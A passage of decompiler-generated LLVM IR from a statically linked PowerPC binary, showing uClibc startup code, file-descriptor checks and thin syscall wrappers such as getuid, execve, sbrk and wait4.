  %v0_1000bfa8 = phi i32 [ %v0_1000bfa8.pre, %dec_label_pc_1000bf80.dec_label_pc_1000bf98_crit_edge ], [ %v3_1000bf94, %dec_label_pc_1000bf90 ]
  ret i32 %v0_1000bfa8

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000bf98, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf80, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_1000bfb4 = load i32, i32* @r3, align 4
  ret i32 %v0_1000bfb4
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268484572, i32* @lr, align 4
  %v2_1000bfd8 = call i32 @__libc_fcntl(i32 1, i32 1)
  %v3_1000bfdc = icmp eq i32 %v2_1000bfd8, -1
  br i1 %v3_1000bfdc, label %dec_label_pc_1000bfe4, label %dec_label_pc_1000c004

dec_label_pc_1000bfe4:                            ; preds = %entry
  %v0_1000bfe8 = load i32, i32* @r30, align 4
  store i32 268484600, i32* @lr, align 4
  %v3_1000bff4 = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_10012764.354 to i32), i32 %v0_1000bfe8)
  %v1_1000bff8 = load i32, i32* @r31, align 4
  %v4_1000bff8 = icmp eq i32 %v3_1000bff4, %v1_1000bff8
  br i1 %v4_1000bff8, label %dec_label_pc_1000c004, label %dec_label_pc_1000c000

dec_label_pc_1000c000:                            ; preds = %dec_label_pc_1000bfe4
  %v1_1000c000 = call i32 @abort(i32 %v3_1000bff4)
  br label %dec_label_pc_1000c004

dec_label_pc_1000c004:                            ; preds = %entry, %dec_label_pc_1000bfe4, %dec_label_pc_1000c000
  %v0_1000c014 = phi i32 [ %v2_1000bfd8, %entry ], [ %v3_1000bff4, %dec_label_pc_1000bfe4 ], [ %v1_1000c000, %dec_label_pc_1000c000 ]
  ret i32 %v0_1000c014

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_open, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 0, 5, 7, 6, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_1000c004, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000c038 = load i32, i32* @global_var_1002356c.355, align 4
  %v3_1000c03c = icmp eq i32 %v3_1000c038, 0
  br i1 %v3_1000c03c, label %dec_label_pc_1000c060, label %dec_label_pc_1000c084

dec_label_pc_1000c060:                            ; preds = %entry
  store i32 1, i32* @global_var_1002356c.355, align 4
  store i32 4096, i32* @global_var_10023560.271, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32 -31804), i32 0), label %dec_label_pc_1000c084, label %dec_label_pc_1000c070

dec_label_pc_1000c070:                            ; preds = %dec_label_pc_1000c060
  %v1_1000c080 = call i32 @_stdio_init(i32 add (i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32 -31804))
  store i32 %v1_1000c080, i32* @r3, align 4
  br label %dec_label_pc_1000c084

dec_label_pc_1000c084:                            ; preds = %entry, %dec_label_pc_1000c060, %dec_label_pc_1000c070
  %v0_1000c094 = load i32, i32* @r3, align 4
  ret i32 %v0_1000c094

; uselistorder directives
  uselistorder label %dec_label_pc_1000c084, { 2, 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_1000c0b0 = mul i32 %arg2, 4
  %v2_1000c0b4 = add i32 %tmp, %v1_1000c0b0
  %v0_1000c0b8 = load i32, i32* @r9, align 4
  store i32 %v0_1000c0b8, i32* @global_var_10023558.356, align 4
  %v1_1000c0bc = add i32 %v2_1000c0b4, 4
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 %v1_1000c0bc, i32* @global_var_1002355c.350, align 4
  store i32 %arg6, i32* @global_var_10023568.353, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  %v2_1000c0dc = load i32, i32* %arg3, align 4
  store i32 %arg5, i32* @r27, align 4
  %v4_1000c0e4 = icmp eq i32 %v1_1000c0bc, %v2_1000c0dc
  br i1 %v4_1000c0e4, label %dec_label_pc_1000c0ec, label %dec_label_pc_1000c0f0

dec_label_pc_1000c0ec:                            ; preds = %entry
  store i32 %v2_1000c0b4, i32* @global_var_1002355c.350, align 4
  br label %dec_label_pc_1000c0f0

dec_label_pc_1000c0f0:                            ; preds = %entry, %dec_label_pc_1000c0ec
  %v2_1000c0f0 = ptrtoint i32* %stack_var_-168 to i32
  store i32 268484864, i32* @lr, align 4
  %v3_1000c0fc = call i32 @__GI_memset(i32 %v2_1000c0f0, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_1002355c.350, align 4
  br label %dec_label_pc_1000c10c

dec_label_pc_1000c10c:                            ; preds = %dec_label_pc_1000c10c, %dec_label_pc_1000c0f0
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_1000c0f0 ], [ %v1_1000c110, %dec_label_pc_1000c10c ]
  %v1_1000c10c = inttoptr i32 %storemerge to i32*
  %v2_1000c10c = load i32, i32* %v1_1000c10c, align 4
  %v1_1000c110 = add i32 %storemerge, 4
  %v3_1000c114 = icmp eq i32 %v2_1000c10c, 0
  br i1 %v3_1000c114, label %dec_label_pc_1000c11c, label %dec_label_pc_1000c10c

dec_label_pc_1000c11c:                            ; preds = %dec_label_pc_1000c10c
  store i32 %v1_1000c110, i32* %r29.global-to-local, align 4
  %v1_1000c14812 = inttoptr i32 %v1_1000c110 to i32*
  %v2_1000c14813 = load i32, i32* %v1_1000c14812, align 4
  %v3_1000c14c16 = icmp eq i32 %v2_1000c14813, 0
  br i1 %v3_1000c14c16, label %dec_label_pc_1000c154, label %dec_label_pc_1000c124

dec_label_pc_1000c124:                            ; preds = %dec_label_pc_1000c11c, %dec_label_pc_1000c144
  %v0_1000c138 = phi i32 [ %v1_1000c144, %dec_label_pc_1000c144 ], [ %v1_1000c110, %dec_label_pc_1000c11c ]
  %v0_1000c12c = phi i32 [ %v2_1000c148, %dec_label_pc_1000c144 ], [ %v2_1000c14813, %dec_label_pc_1000c11c ]
  %v2_1000c124 = icmp ugt i32 %v0_1000c12c, 14
  br i1 %v2_1000c124, label %dec_label_pc_1000c144, label %dec_label_pc_1000c12c

dec_label_pc_1000c12c:                            ; preds = %dec_label_pc_1000c124
  %v1_1000c12c = mul i32 %v0_1000c12c, 8
  %v2_1000c134 = add i32 %v1_1000c12c, %v2_1000c0f0
  store i32 %v2_1000c134, i32* @r3, align 4
  store i32 %v0_1000c138, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268484932, i32* @lr, align 4
  %v0_1000c140 = call i32 @memcpy()
  %v0_1000c144.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000c144

dec_label_pc_1000c144:                            ; preds = %dec_label_pc_1000c124, %dec_label_pc_1000c12c
  %v0_1000c144 = phi i32 [ %v0_1000c138, %dec_label_pc_1000c124 ], [ %v0_1000c144.pre, %dec_label_pc_1000c12c ]
  %v1_1000c144 = add i32 %v0_1000c144, 8
  store i32 %v1_1000c144, i32* %r29.global-to-local, align 4
  %v1_1000c148 = inttoptr i32 %v1_1000c144 to i32*
  %v2_1000c148 = load i32, i32* %v1_1000c148, align 4
  %v3_1000c14c = icmp eq i32 %v2_1000c148, 0
  br i1 %v3_1000c14c, label %dec_label_pc_1000c154, label %dec_label_pc_1000c124

dec_label_pc_1000c154:                            ; preds = %dec_label_pc_1000c144, %dec_label_pc_1000c11c
  %v1_1000c158 = call i32 @_dl_aux_init(i32 %v2_1000c0f0)
  store i32 %v1_1000c158, i32* @r3, align 4
  store i32 268484960, i32* @lr, align 4
  %v1_1000c15c = call i32 @__GI___uClibc_init(i32 %v1_1000c158)
  %v3_1000c164 = icmp eq i32 %tmp27, 0
  br i1 %v3_1000c164, label %dec_label_pc_1000c16c, label %dec_label_pc_1000c170

dec_label_pc_1000c16c:                            ; preds = %dec_label_pc_1000c154
  br label %dec_label_pc_1000c170

dec_label_pc_1000c170:                            ; preds = %dec_label_pc_1000c154, %dec_label_pc_1000c16c
  %v0_1000c178 = phi i32 [ %tmp27, %dec_label_pc_1000c154 ], [ 4096, %dec_label_pc_1000c16c ]
  store i32 %v0_1000c178, i32* @global_var_10023560.271, align 4
  %v3_1000c17c = icmp eq i32 %tmp26, -1
  br i1 %v3_1000c17c, label %dec_label_pc_1000c184, label %dec_label_pc_1000c1b8

dec_label_pc_1000c184:                            ; preds = %dec_label_pc_1000c170
  store i32 268485000, i32* @lr, align 4
  %v1_1000c184 = call i32 @getuid(i32 268566528)
  store i32 %v1_1000c184, i32* %r29.global-to-local, align 4
  store i32 268485008, i32* @lr, align 4
  %v0_1000c18c = call i32 @geteuid()
  %v4_1000c190 = icmp eq i32 %v1_1000c184, %v0_1000c18c
  br i1 %v4_1000c190, label %dec_label_pc_1000c198, label %dec_label_pc_1000c1d4

dec_label_pc_1000c198:                            ; preds = %dec_label_pc_1000c184
  store i32 268485020, i32* @lr, align 4
  %v1_1000c198 = call i32 @getgid(i32 %v0_1000c18c)
  store i32 %v1_1000c198, i32* %r29.global-to-local, align 4
  store i32 268485028, i32* @lr, align 4
  %v0_1000c1a0 = call i32 @getegid()
  %v4_1000c1a4 = icmp eq i32 %v1_1000c198, %v0_1000c1a0
  br i1 %v4_1000c1a4, label %dec_label_pc_1000c1ac.thread, label %dec_label_pc_1000c1d4

dec_label_pc_1000c1ac.thread:                     ; preds = %dec_label_pc_1000c198
  br label %dec_label_pc_1000c204

dec_label_pc_1000c1b8:                            ; preds = %dec_label_pc_1000c170
  %v4_1000c1bc = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_1000c1bc, label %dec_label_pc_1000c1c4, label %dec_label_pc_1000c1d4

dec_label_pc_1000c1c4:                            ; preds = %dec_label_pc_1000c1b8
  br label %dec_label_pc_1000c1d4

dec_label_pc_1000c1d4:                            ; preds = %dec_label_pc_1000c1c4, %dec_label_pc_1000c1b8, %dec_label_pc_1000c198, %dec_label_pc_1000c184
  store i32 268485092, i32* @lr, align 4
  %v2_1000c1e0 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 268485108, i32* @lr, align 4
  %v2_1000c1f0 = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 268485124, i32* @lr, align 4
  %v2_1000c200 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_1000c204

dec_label_pc_1000c204:                            ; preds = %dec_label_pc_1000c1ac.thread, %dec_label_pc_1000c1d4
  %v0_1000c210 = load i32, i32* @r30, align 4
  %v1_1000c210 = inttoptr i32 %v0_1000c210 to i32*
  %v2_1000c210 = load i32, i32* %v1_1000c210, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_1000c210, i32* inttoptr (i32 268580100 to i32*), align 4
  %v0_1000c230 = load i32, i32* @r27, align 4
  store i32 %v0_1000c230, i32* @global_var_10023564.352, align 4
  br i1 false, label %dec_label_pc_1000c238, label %dec_label_pc_1000c2b0

dec_label_pc_1000c238:                            ; preds = %dec_label_pc_1000c204, %dec_label_pc_1000c238
  br i1 undef, label %dec_label_pc_1000c238, label %dec_label_pc_1000c2b0

dec_label_pc_1000c2b0:                            ; preds = %dec_label_pc_1000c238, %dec_label_pc_1000c204
  %v0_1000c25c = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_1000c25c)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_1000c2c0 = call i32 @__errno_location()
  %v2_1000c2c8 = inttoptr i32 %v0_1000c2c0 to i32*
  store i32 0, i32* %v2_1000c2c8, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32), i32 -14872), i32 0), label %dec_label_pc_1000c2e8, label %dec_label_pc_1000c2dc

dec_label_pc_1000c2dc:                            ; preds = %dec_label_pc_1000c2b0
  %v0_1000c2dc = call i32 @__GI___h_errno_location()
  %v2_1000c2e4 = inttoptr i32 %v0_1000c2dc to i32*
  store i32 0, i32* %v2_1000c2e4, align 4
  br label %dec_label_pc_1000c2e8

dec_label_pc_1000c2e8:                            ; preds = %dec_label_pc_1000c2b0, %dec_label_pc_1000c2dc
  %v0_1000c2f4 = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_1000c2f4)
  %v0_1000c300 = call i32 @__GI_exit()
  ret i32 %v0_1000c300

; uselistorder directives
  uselistorder i32 %v2_1000c148, { 1, 0 }
  uselistorder i32 %v1_1000c144, { 2, 1, 0 }
  uselistorder i32 %v1_1000c110, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_1000c0f0, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32 ()* @__GI_exit, { 0, 6, 5, 3, 4, 1, 2 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 4096, { 1, 3, 10, 11, 2, 9, 4, 5, 6, 7, 0, 8 }
  uselistorder i32 14, { 2, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1000c2e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c238, { 1, 0 }
  uselistorder label %dec_label_pc_1000c204, { 1, 0 }
  uselistorder label %dec_label_pc_1000c170, { 1, 0 }
  uselistorder label %dec_label_pc_1000c144, { 1, 0 }
  uselistorder label %dec_label_pc_1000c124, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0f0, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_1000c310 = load i32, i32* @r3, align 4
  store i32 %v0_1000c310, i32* @r29, align 4
  %v0_1000c318 = call i32 @__errno_location()
  %v0_1000c31c = load i32, i32* @r29, align 4
  %v2_1000c31c = inttoptr i32 %v0_1000c318 to i32*
  store i32 %v0_1000c31c, i32* %v2_1000c31c, align 4
  ret i32 -1
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c350 = call i32 @__asm_mfcr()
  %v1_1000c354 = and i32 %v0_1000c350, 268435456
  %v3_1000c354 = icmp eq i32 %v1_1000c354, 0
  store i32 %v0_1000c350, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c354, label %dec_label_pc_1000c36c, label %dec_label_pc_1000c360

dec_label_pc_1000c360:                            ; preds = %entry
  %v0_1000c360 = call i32 @__errno_location()
  %v0_1000c364 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c364 = inttoptr i32 %v0_1000c360 to i32*
  store i32 %v0_1000c364, i32* %v2_1000c364, align 4
  br label %dec_label_pc_1000c36c

dec_label_pc_1000c36c:                            ; preds = %entry, %dec_label_pc_1000c360
  %v0_1000c37c = phi i32 [ %v0_1000c350, %entry ], [ -1, %dec_label_pc_1000c360 ]
  ret i32 %v0_1000c37c

; uselistorder directives
  uselistorder label %dec_label_pc_1000c36c, { 1, 0 }
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c398 = call i32 @__asm_mfcr()
  %v1_1000c39c = and i32 %v0_1000c398, 268435456
  %v3_1000c39c = icmp eq i32 %v1_1000c39c, 0
  store i32 %v0_1000c398, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c39c, label %dec_label_pc_1000c3b4, label %dec_label_pc_1000c3a8

dec_label_pc_1000c3a8:                            ; preds = %entry
  %v0_1000c3a8 = call i32 @__errno_location()
  %v0_1000c3ac = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c3ac = inttoptr i32 %v0_1000c3a8 to i32*
  store i32 %v0_1000c3ac, i32* %v2_1000c3ac, align 4
  br label %dec_label_pc_1000c3b4

dec_label_pc_1000c3b4:                            ; preds = %entry, %dec_label_pc_1000c3a8
  %v0_1000c3c4 = phi i32 [ %v0_1000c398, %entry ], [ -1, %dec_label_pc_1000c3a8 ]
  ret i32 %v0_1000c3c4

; uselistorder directives
  uselistorder label %dec_label_pc_1000c3b4, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c3e0 = call i32 @__asm_mfcr()
  %v1_1000c3e4 = and i32 %v0_1000c3e0, 268435456
  %v3_1000c3e4 = icmp eq i32 %v1_1000c3e4, 0
  store i32 %v0_1000c3e0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c3e4, label %dec_label_pc_1000c3fc, label %dec_label_pc_1000c3f0

dec_label_pc_1000c3f0:                            ; preds = %entry
  %v0_1000c3f0 = call i32 @__errno_location()
  %v0_1000c3f4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c3f4 = inttoptr i32 %v0_1000c3f0 to i32*
  store i32 %v0_1000c3f4, i32* %v2_1000c3f4, align 4
  br label %dec_label_pc_1000c3fc

dec_label_pc_1000c3fc:                            ; preds = %entry, %dec_label_pc_1000c3f0
  %v0_1000c40c = phi i32 [ %v0_1000c3e0, %entry ], [ -1, %dec_label_pc_1000c3f0 ]
  ret i32 %v0_1000c40c

; uselistorder directives
  uselistorder label %dec_label_pc_1000c3fc, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c428 = call i32 @__asm_mfcr()
  %v1_1000c42c = and i32 %v0_1000c428, 268435456
  %v3_1000c42c = icmp eq i32 %v1_1000c42c, 0
  store i32 %v0_1000c428, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c42c, label %dec_label_pc_1000c444, label %dec_label_pc_1000c438

dec_label_pc_1000c438:                            ; preds = %entry
  %v0_1000c438 = call i32 @__errno_location()
  %v0_1000c43c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c43c = inttoptr i32 %v0_1000c438 to i32*
  store i32 %v0_1000c43c, i32* %v2_1000c43c, align 4
  br label %dec_label_pc_1000c444

dec_label_pc_1000c444:                            ; preds = %entry, %dec_label_pc_1000c438
  %v0_1000c454 = phi i32 [ %v0_1000c428, %entry ], [ -1, %dec_label_pc_1000c438 ]
  ret i32 %v0_1000c454

; uselistorder directives
  uselistorder label %dec_label_pc_1000c444, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c470 = call i32 @__asm_mfcr()
  %v1_1000c474 = and i32 %v0_1000c470, 268435456
  %v3_1000c474 = icmp eq i32 %v1_1000c474, 0
  store i32 %v0_1000c470, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c474, label %dec_label_pc_1000c48c, label %dec_label_pc_1000c480

dec_label_pc_1000c480:                            ; preds = %entry
  %v0_1000c480 = call i32 @__errno_location()
  %v0_1000c484 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c484 = inttoptr i32 %v0_1000c480 to i32*
  store i32 %v0_1000c484, i32* %v2_1000c484, align 4
  br label %dec_label_pc_1000c48c

dec_label_pc_1000c48c:                            ; preds = %entry, %dec_label_pc_1000c480
  %v0_1000c49c = phi i32 [ %v0_1000c470, %entry ], [ -1, %dec_label_pc_1000c480 ]
  ret i32 %v0_1000c49c

; uselistorder directives
  uselistorder label %dec_label_pc_1000c48c, { 1, 0 }
}

define i32 @getuid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c4b8 = call i32 @__asm_mfcr()
  %v1_1000c4bc = and i32 %v0_1000c4b8, 268435456
  %v3_1000c4bc = icmp eq i32 %v1_1000c4bc, 0
  store i32 %v0_1000c4b8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c4bc, label %dec_label_pc_1000c4d4, label %dec_label_pc_1000c4c8

dec_label_pc_1000c4c8:                            ; preds = %entry
  %v0_1000c4c8 = call i32 @__errno_location()
  %v0_1000c4cc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c4cc = inttoptr i32 %v0_1000c4c8 to i32*
  store i32 %v0_1000c4cc, i32* %v2_1000c4cc, align 4
  br label %dec_label_pc_1000c4d4

dec_label_pc_1000c4d4:                            ; preds = %entry, %dec_label_pc_1000c4c8
  %v0_1000c4e4 = phi i32 [ %v0_1000c4b8, %entry ], [ -1, %dec_label_pc_1000c4c8 ]
  ret i32 %v0_1000c4e4

; uselistorder directives
  uselistorder label %dec_label_pc_1000c4d4, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c500 = call i32 @__asm_mfcr()
  %v1_1000c504 = and i32 %v0_1000c500, 268435456
  %v3_1000c504 = icmp eq i32 %v1_1000c504, 0
  store i32 %v0_1000c500, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c504, label %dec_label_pc_1000c51c, label %dec_label_pc_1000c510

dec_label_pc_1000c510:                            ; preds = %entry
  %v0_1000c510 = call i32 @__errno_location()
  %v0_1000c514 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c514 = inttoptr i32 %v0_1000c510 to i32*
  store i32 %v0_1000c514, i32* %v2_1000c514, align 4
  br label %dec_label_pc_1000c51c

dec_label_pc_1000c51c:                            ; preds = %entry, %dec_label_pc_1000c510
  %v0_1000c52c = phi i32 [ %v0_1000c500, %entry ], [ -1, %dec_label_pc_1000c510 ]
  ret i32 %v0_1000c52c

; uselistorder directives
  uselistorder label %dec_label_pc_1000c51c, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v3_1000c54c = load i32, i32* @global_var_10023590.359, align 4
  %v3_1000c550 = icmp eq i32 %v3_1000c54c, 0
  br i1 %v3_1000c550, label %dec_label_pc_1000c558, label %dec_label_pc_1000c564

dec_label_pc_1000c558:                            ; preds = %entry
  store i32 268485980, i32* @lr, align 4
  %v1_1000c558 = call i32 @__GI_brk(i32 0)
  %v1_1000c55c = icmp slt i32 %v1_1000c558, 0
  br i1 %v1_1000c55c, label %dec_label_pc_1000c584, label %dec_label_pc_1000c558.dec_label_pc_1000c564_crit_edge

dec_label_pc_1000c558.dec_label_pc_1000c564_crit_edge: ; preds = %dec_label_pc_1000c558
  %v0_1000c564.pre = load i32, i32* @r30, align 4
  %v3_1000c568.pre = load i32, i32* @global_var_10023590.359, align 4
  br label %dec_label_pc_1000c564

dec_label_pc_1000c564:                            ; preds = %dec_label_pc_1000c558.dec_label_pc_1000c564_crit_edge, %entry
  %v3_1000c568 = phi i32 [ %v3_1000c568.pre, %dec_label_pc_1000c558.dec_label_pc_1000c564_crit_edge ], [ %v3_1000c54c, %entry ]
  %v1_1000c570 = phi i32 [ %v0_1000c564.pre, %dec_label_pc_1000c558.dec_label_pc_1000c564_crit_edge ], [ %arg1, %entry ]
  %v3_1000c564 = icmp eq i32 %v1_1000c570, 0
  store i32 %v3_1000c568, i32* @r31, align 4
  br i1 %v3_1000c564, label %dec_label_pc_1000c588, label %dec_label_pc_1000c578

dec_label_pc_1000c578:                            ; preds = %dec_label_pc_1000c564
  %v2_1000c570 = add i32 %v1_1000c570, %v3_1000c568
  store i32 268486012, i32* @lr, align 4
  %v1_1000c578 = call i32 @__GI_brk(i32 %v2_1000c570)
  %tmp6 = icmp sgt i32 %v1_1000c578, -1
  br i1 %tmp6, label %dec_label_pc_1000c578.dec_label_pc_1000c588_crit_edge, label %dec_label_pc_1000c584

dec_label_pc_1000c578.dec_label_pc_1000c588_crit_edge: ; preds = %dec_label_pc_1000c578
  %v0_1000c58c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000c588

dec_label_pc_1000c584:                            ; preds = %dec_label_pc_1000c578, %dec_label_pc_1000c558
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_1000c588

dec_label_pc_1000c588:                            ; preds = %dec_label_pc_1000c578.dec_label_pc_1000c588_crit_edge, %dec_label_pc_1000c564, %dec_label_pc_1000c584
  %v0_1000c58c = phi i32 [ %v0_1000c58c.pre, %dec_label_pc_1000c578.dec_label_pc_1000c588_crit_edge ], [ %v3_1000c568, %dec_label_pc_1000c564 ], [ -1, %dec_label_pc_1000c584 ]
  ret i32 %v0_1000c58c

; uselistorder directives
  uselistorder i32 %v3_1000c568, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_1000c588, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c5b8 = call i32 @__asm_mfcr()
  %v1_1000c5bc = and i32 %v0_1000c5b8, 268435456
  %v3_1000c5bc = icmp eq i32 %v1_1000c5bc, 0
  store i32 %v0_1000c5b8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c5bc, label %dec_label_pc_1000c5d4, label %dec_label_pc_1000c5c8

dec_label_pc_1000c5c8:                            ; preds = %entry
  %v0_1000c5c8 = call i32 @__errno_location()
  %v0_1000c5cc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c5cc = inttoptr i32 %v0_1000c5c8 to i32*
  store i32 %v0_1000c5cc, i32* %v2_1000c5cc, align 4
  br label %dec_label_pc_1000c5d4

dec_label_pc_1000c5d4:                            ; preds = %entry, %dec_label_pc_1000c5c8
  %v0_1000c5e4 = phi i32 [ %v0_1000c5b8, %entry ], [ -1, %dec_label_pc_1000c5c8 ]
  ret i32 %v0_1000c5e4

; uselistorder directives
  uselistorder label %dec_label_pc_1000c5d4, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_10023574.360 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1000c5f4 = icmp eq i32 %arg1, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 16, i32* @r6, align 4
  %v2_1000c610 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1000c610, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_1000c5f4, label %dec_label_pc_1000c61c, label %dec_label_pc_1000c624

dec_label_pc_1000c61c:                            ; preds = %entry
  %v2_1000c61c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000c61c, i32* @r3, align 4
  br label %dec_label_pc_1000c624

dec_label_pc_1000c624:                            ; preds = %entry, %dec_label_pc_1000c61c
  %v0_1000c628 = phi i32 [ %arg2, %entry ], [ 0, %dec_label_pc_1000c61c ]
  %v2_1000c624 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_1000c628, i32* %stack_var_-40, align 4
  store i32 %v2_1000c624, i32* %stack_var_-36, align 4
  store i32 268486196, i32* @lr, align 4
  %v0_1000c630 = call i32 @__GI_wcsnrtombs()
  %v3_1000c634 = icmp eq i32 %v0_1000c630, 0
  br i1 %v3_1000c634, label %dec_label_pc_1000c63c, label %dec_label_pc_1000c640

dec_label_pc_1000c63c:                            ; preds = %dec_label_pc_1000c624
  br label %dec_label_pc_1000c640

dec_label_pc_1000c640:                            ; preds = %dec_label_pc_1000c624, %dec_label_pc_1000c63c
  %v0_1000c64c = phi i32 [ %v0_1000c630, %dec_label_pc_1000c624 ], [ 1, %dec_label_pc_1000c63c ]
  ret i32 %v0_1000c64c

; uselistorder directives
  uselistorder label %dec_label_pc_1000c640, { 1, 0 }
  uselistorder label %dec_label_pc_1000c624, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_1000c650 = load i32, i32* @r6, align 4
  store i32 %v0_1000c650, i32* @r7, align 4
  %v0_1000c654 = load i32, i32* @r5, align 4
  store i32 %v0_1000c654, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_1000c65c = call i32 @__GI_wcsnrtombs()
  ret i32 %v0_1000c65c

; uselistorder directives
  uselistorder i32 ()* @__GI_wcsnrtombs, { 1, 0 }
}

define i32 @__GI_wcsnrtombs() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000c660 = load i32, i32* @r3, align 4
  %v3_1000c660 = icmp eq i32 %v0_1000c660, 0
  %v0_1000c664 = load i32, i32* @lr, align 4
  store i32 %v0_1000c664, i32* %r0.global-to-local, align 4
  br i1 %v3_1000c660, label %dec_label_pc_1000c68c, label %dec_label_pc_1000c674

dec_label_pc_1000c674:                            ; preds = %entry
  %v1_1000c674 = load i32, i32* @r4, align 4
